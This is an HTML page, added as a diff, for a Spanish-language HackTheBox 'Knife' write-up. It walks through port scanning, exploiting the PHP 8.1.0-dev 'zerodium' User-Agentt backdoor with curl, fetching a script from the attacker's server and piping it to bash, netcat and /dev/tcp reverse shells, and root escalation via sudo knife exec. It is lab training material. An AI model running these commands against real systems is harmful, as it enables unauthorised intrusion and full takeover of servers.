@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Knife</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Knife | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Knife" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo)." />
+<meta property="og:description" content="Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo)." />
+<link rel="canonical" href="http://localhost:4000/htb/knife" />
+<meta property="og:url" content="http://localhost:4000/htb/knife" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-28T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" />
+<meta property="twitter:title" content="HackTheBox - Knife" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-28T00:00:00-07:00","datePublished":"2021-08-28T00:00:00-07:00","description":"Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).","headline":"HackTheBox - Knife","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/knife"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/knife"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Knife</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-28">28 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil, explotaremos <strong>PHP</strong> y jugaremos con la herramienta <strong>knife</strong> para ejecutar código <strong>Ruby</strong> como el usuario <strong>root</strong> (mediante <strong>sudo</strong>).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347knifeHTB.png" alt="347knifeHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/98767">MrKN16H</a>.</p>
+
+<p>Las locuras de nuestra existencia e.e</p>
+
+<p>Hohoholaaa, en esta máquina nos encontraremos un servidor web con una versión <code>PHP</code> vulnerable a ejecución remota de comandos, la usaremos para obtener una <strong>Reverse Shell</strong> como el usuario <code>james</code>.</p>
+
+<p>Enumerando los permisos que tenemos como otros usuarios (<code>sudo</code>), veremos que podemos ejecutar un binario llamado <code>knife</code>, buscando en internet formas de escalar privilegios usandolo, llegaremos a encontrar el subcomando <code>exec</code>, con él podremos ejecutar scripts o comandos <code>Ruby</code>, lo usaremos para establecer una <strong>Shell</strong> como el usuario <code>root</code> en el sistema.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastante juguetona, un poquito de movimientos con las manos (: y alguna que otra vuln conocida.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Moving fast…</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Escaneo de puertos mediante <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Vemos que hay en el puerto 80</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#expl-revsh-james">Jugamos con la vulnerabilidad de <strong>PHP</strong> para conseguir <strong>RCE</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Escaneo de puertos con <u>nmap</u> <a href="#enum-nmap">📌</a></h2>
+
+<p>Empezaremos haciendo un escaneo de puertos, esto nos permitirá conocer que servicios esta corriendo el sistema, usaremos <strong>nmap</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.242 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.242
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.242 ()	Status: Up
+Host: 10.10.10.242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 77.55 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Obtención de una Shell de manera segura</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Servidor web</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora que tenemos los puertos, hagamos un escaneo más reducido, en él buscaremos que versiones y scripts están relacionados con cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, que en este caso daría igual, ya que son 2 puertos no más, pero esto es muy funcional cuando tenemos varios puertos, así no tendríamos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.242
+    [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80 -sC -sV 10.10.10.242 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Tendriamos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.242
+Nmap scan report for 10.10.10.242
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.71 seconds
+</code></pre>
+
+<p>Cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache/2.4.41</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero por ahora poco más, así que empecemos a explorar cada puerto y veamos por donde pinchar.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347page80.png" alt="347page80" /></p>
+
+<p>Encontramos una interfaz bastante simple, sin posibilidad de interactuar con ella ni movernos por ahí…</p>
+
+<p>Buscando vulnerabilidades relacionadas con <code>Apache 2.4.41</code> no encontramos nada útil.</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Jugando con <strong>Wappalyzer</strong> (extensión web) vemos que el servidor web cuenta con el servicio <strong>PHP</strong> en su versión <code>8.1.0</code>, buscando en internet vulnerabilidades sobre ella, encontramos una interesante:</p>
+
+<ul>
+  <li><a href="https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html"><strong>PHP 8.1.0-dev</strong> Backdoor Remote Command Injection</a>.</li>
+  <li><a href="https://www.exploit-db.com/exploits/49933"><strong>PHP 8.1.0-dev</strong> - ‘User-Agentt’ Remote Code Execution</a>.</li>
+</ul>
+
+<p>Usándola podremos conseguir ejecución remota de comandos aprovechándonos de la función <a href="https://flylib.com/books/en/2.565.1/calling_back_into_php.html">zend_eval_string()</a> (que puede ejecutar pequeños fragmentos de código en el sistema) de <strong>PHP</strong>, el código vulnerable es este:</p>
+
+<pre><code class="language-php">...
+  convert_to_string(enc);
+  if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+    zend_try {
+      zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+...
+</code></pre>
+
+<p>Donde prácticamente lo que hace es:</p>
+
+<ol>
+  <li>Pasa (según el nombre de la función) lo que llegue (<code>enc</code>) a cadena de texto.</li>
+  <li>Si ese contenido (<code>enc</code>) a la primera encuentra (<a href="https://www.php.net/manual/es/function.strstr.php">strstr</a>) la cadena “<strong>zerodium</strong>” en <code>enc</code>.</li>
+  <li>Entra a ejecutar (<a href="https://flylib.com/books/en/2.565.1/calling_back_into_php.html">zend_eval_string</a>) el contenido de <code>enc</code>.
+    <ul>
+      <li>Así que simplemente deberíamos aprovechar que entre en esta función e indicarle que nos ejecute algo (con ayuda de <code>system()</code> o <code>exec()</code> o <code>shell_exec</code> o lo que sea :P)</li>
+    </ul>
+  </li>
+</ol>
+
+<p>Esto tiene que hacerse con el header <code>User-Agentt</code>, donde su contenido sea el que contenga <strong>zerodium…</strong>, siguiendo los <strong>pocs</strong> vemos que su explotación es muy sencilla, podemos jugar con <code>curL</code> y probar:</p>
+
+<hr />
+
+<h2 id="expl-revsh-james">Jugamos con la vulnerabilidad de <u>PHP 8.1.0</u> <a href="#expl-revsh-james">📌</a></h2>
+
+<p>Por ejemplo, si queremos ejecutar el comando <code>whoami</code>, haríamos:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("whoami");' | head -n 1
+james
+</code></pre>
+
+<p>O para ver el <code>id</code> de (en este caso) <strong>james</strong>:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("id");' | head -n 1
+uid=1000(james) gid=1000(james) groups=1000(james)
+</code></pre>
+
+<p>Así que ya tenemos constancia que estamos ejecutando comandos en el sistema, pero ¿sobre cuál?</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("hostname");' | head -n 1
+knife
+</code></pre>
+
+<p>Bien, al parecer estamos sobre el sistema base y no sobre algún contenedor, pues aprovechemos esto para obtener una Reverse Shell en el sistema…</p>
+
+<p>Podríamos colocar el comando dentro de la función <code>system()</code>, pero para trabajar un poco más organizados y no estar cambiando muchas cosas, vamos a crear un archivo <code>.sh</code> el cual contendrá nuestro código a ejecutar en el sistema yyy lo único que haremos sera decirle al sistema que venga a buscarlo (:</p>
+
+<p>Pero primero validemos si existe <code>curL</code> en la máquina:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("which curl");' | head -n 1
+/usr/bin/curl
+</code></pre>
+
+<p>Bien, entonces ahora si creemos el archivo <code>.sh</code>:</p>
+
+<pre><code class="language-bash">❱ cat rev.sh 
+#!/bin/bash
+
+id | nc 10.10.14.103 4433
+</code></pre>
+
+<p>Inicialmente le diremos que nos envíe al puerto <strong>4433</strong> de nuestra máquina el resultado del comando <strong>id</strong>. (Esto nos sirve para comprobar si existe <code>nc</code>, si nos lee el archivo <code>.sh</code> y reafirmamos el <strong>RCE</strong>)</p>
+
+<p>Pongámonos en escucha por el puerto <strong>4433</strong>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y levantemos nuestro servidor web, así jugando con <code>curL</code> lograremos que la máquina encuentre nuestro archivo <code>.sh</code>:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Ahora sí, ejecutamos:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh");' | head
+#!/bin/bash
+
+id | nc 10.10.14.103 4433
+&lt;!DOCTYPE html&gt;
+...
+</code></pre>
+
+<p>Lo lee, solo nos queda indicarle que en vez de leer el script lo interprete, o sea, lo ejecute:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash");' | head
+</code></pre>
+
+<p>Y en nuestro listener obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_idNC.png" alt="347bash_phpvuln_idNC" /></p>
+
+<p>Perfessssssto, pues ahora si hagamos la <strong>Reverse Shell</strong>, lo único que debemos cambiar es nuestro archivo <code>.sh</code> y volvernos a poner en escucha:</p>
+
+<pre><code class="language-bash">❱ cat rev.sh 
+#!/bin/bash
+
+nc 10.10.14.103 4433 -e /bin/bash
+</code></pre>
+
+<p>Con esto le indicamos que apenas establezca la conexión con el puerto <strong>4433</strong> de nuestra máquina nos lance una <code>/bin/bash</code> (una <strong>Shell</strong>)…</p>
+
+<p>Pero ejecutando de nuevo no conseguimos nada.</p>
+
+<p>Lo más probable es que la versión de <strong>nc</strong> que tenga el sistema sea la que <strong>no soporta</strong> el uso del parámetro <code>-e</code>, así que modifiquemos el archivo <code>.sh</code> con otra opción:</p>
+
+<pre><code class="language-bash">❱ cat rev.sh 
+#!/bin/bash
+
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.103/4433 0&gt;&amp;1'
+</code></pre>
+
+<p>Prácticamente le indicamos lo mismo, “apenas obtengas la conexión con el puerto lánzame una <code>bash</code>”, ejecutamos nuestro <code>curL</code> yyyyy:</p>
+
+<pre><code class="language-bash">❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash");'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_jamesRevSH.png" alt="347bash_phpvuln_jamesRevSH" /></p>
+
+<p>Bien, ahora tenemos una <strong>Shell</strong> como <strong>james</strong> en la máquina (:</p>
+
+<h2 id="tratamiento-de-la-tty">Tratamiento de la TTY</h2>
+
+<p>Antes de seguir hagamos nuestra terminal un poco más amigable, permitiéndonos así ejecutar <code>CTRL+C</code>, tener histórico de comandos y movernos entre ellos:</p>
+
+<pre><code class="language-bash">james@knife:/$ script /dev/null -c bash
+#Ejecutamos CTRL+Z
+james@knife:/$ ^Z 
+[1]+  Detenido                nc -lvp 4433
+</code></pre>
+
+<p>Después escribimos:</p>
+
+<pre><code class="language-bash">❱ stty raw -echo; fg
+</code></pre>
+
+<p>Y aunque se vea corrido escribimos <code>reset</code> y después <code>xterm</code>:</p>
+
+<pre><code class="language-bash">            reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+</code></pre>
+
+<p>Y por ultimo:</p>
+
+<pre><code class="language-bash">james@knife:/$ export TERM=xterm
+james@knife:/$ export SHELL=bash
+</code></pre>
+
+<p>Nos apoyamos de otra ventana para obtener el tamaño de las filas y columnas, ejecutamos <code>stty -a</code>, tomamos esos valores y escribimos ahora en la máquina:</p>
+
+<p>(Estos son los míos)</p>
+
+<pre><code class="language-bash">james@knife:/$ stty rows 43 columns 192
+</code></pre>
+
+<p>Y listo, podemos movernos libremente por la consola sin temor a perderla en algún <code>CTRL+C</code> y además tenemos histórico :)</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Viendo que permisos tenemos sobre otros usuarios (<a href="https://es.wikipedia.org/wiki/Sudo">sudo</a> encontramos que podemos ejecutar un binario como <strong>root</strong>:</p>
+
+<pre><code class="language-bash">james@knife:~$ sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+</code></pre>
+
+<p>Validando el binario, vemos varias cositas:</p>
+
+<pre><code class="language-bash">james@knife:~$ ls -la /usr/bin/knife
+lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -&gt; /opt/chef-workstation/bin/knife
+</code></pre>
+
+<p>Es un <strong>link simbólico</strong> al binario <code>/opt/chef-workstation/bin/knife</code>, bien, rápidamente:</p>
+
+<p>👩‍🍳 <strong><em><code>Chef</code> <a href="https://www.linkeit.com/es/blog/glosario-terminos-chef-server">es un sistema de automatización</a> que facilita el despliegue de servidores y aplicaciones.</em></strong></p>
+
+<p>🔪 <strong><em>Y <a href="https://docs.chef.io/workstation/knife/">Knife</a> es una herramienta de terminal que interactúa con un <u>servidor Chef</u>…</em></strong></p>
+
+<p>Buscando cositas sobre ella y como aprovecharnos de su uso para escalar privilegios, encontramos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_knifelinuxexploit.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><strong>Knife</strong> tiene un <em>subcomando</em> llamado <code>exec</code>, el cual permite la ejecución de scripts <strong>Ruby</strong>.</p>
+
+<p>Echándole un ojo a la <a href="https://docs.chef.io/workstation/knife_exec/">wiki de <strong>knife_exec</strong></a> encontramos su uso:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_opts.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_examples.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Tenemos la opción <code>-E</code> que ejecuta código directamente, pues intentemos jugar con ella…</p>
+
+<ul>
+  <li><a href="https://www.rubyguides.com/2018/12/ruby-system/">How to run <strong>System Commands</strong> from Ruby</a>.</li>
+</ul>
+
+<p>Es muy simple, si queremos ejecutar el comando <code>id</code>, lo haríamos así:</p>
+
+<pre><code class="language-ruby">system("id")
+</code></pre>
+
+<p>¿Sencillito, no? Pues hagámoslo pero con <strong>knife exec</strong>:</p>
+
+<pre><code class="language-bash">james@knife:/$ /usr/bin/knife exec -E 'system("id")'
+</code></pre>
+
+<p>Ejecutamos para saber el <strong>id</strong> del usuario que esta ejecutando el proceso y obtenemos:</p>
+
+<pre><code class="language-bash">james@knife:/$ /usr/bin/knife exec -E 'system("id")'
+WARNING: No knife configuration file found. See https://docs.chef.io/config_rb/ for details.
+uid=1000(james) gid=1000(james) groups=1000(james)
+</code></pre>
+
+<p>Y si, nos ejecuta comandos en este caso como <strong>james</strong>, ya que no le hemos indicado que ejecute <code>/usr/bin/knife</code> con otros permisos o como otro usuario :P (sin <a href="https://es.wikipedia.org/wiki/Sudo">sudo</a>)</p>
+
+<p>Ahora hagámoslo con los permisos del usuario <strong>root</strong> a ver si funciona (<strong>sudo</strong> solito le indica al sistema que queremos jugar con el usuario <strong>root</strong>, o también podríamos indicárselo usando <code>-u root</code>):</p>
+
+<pre><code class="language-bash">james@knife:/$ sudo /usr/bin/knife exec -E 'system("id")'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_idroot.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opa la popa, estamos ejecutando comandos en el sistema como el usuario <strong>root</strong> 😃 Pues ejecutémonos una <code>/bin/bash</code> ahí de rapidez:</p>
+
+<pre><code class="language-bash">james@knife:/$ sudo /usr/bin/knife exec -E 'system("/bin/bash")'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_bash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listoneeeeeeeeeeeeeeeeeeees! Estamos dentro del sistema como el usuario <strong>root</strong> (:</p>
+
+<p>Vistaziemos las flags :o</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>ey, emho telminao’</p>
+
+<p>…</p>
+
+<p>Linda máquina, me gusto que es real-life, un <strong>CVE</strong> y una aplicación que por default tiene la opción de ejecutar comandos.</p>
+
+<p>Lo raro es que esta rateada super bajo y no me parecio que estuviera mal, como máquina para empezar esta muuuuuuuuuy bien.</p>
+
+<p>Bueno, por ahora no es más que agradecimiento hacia la luna y el atardecer 😬 Nos leeremos en otra ocasión yyyyyyyyyyy como siempre, a seguir rompiendo tooooooooodo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Knife&url=http://localhost:4000/htb/knife" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#PHP-explotation">PHP-explotation</a>               
+                    
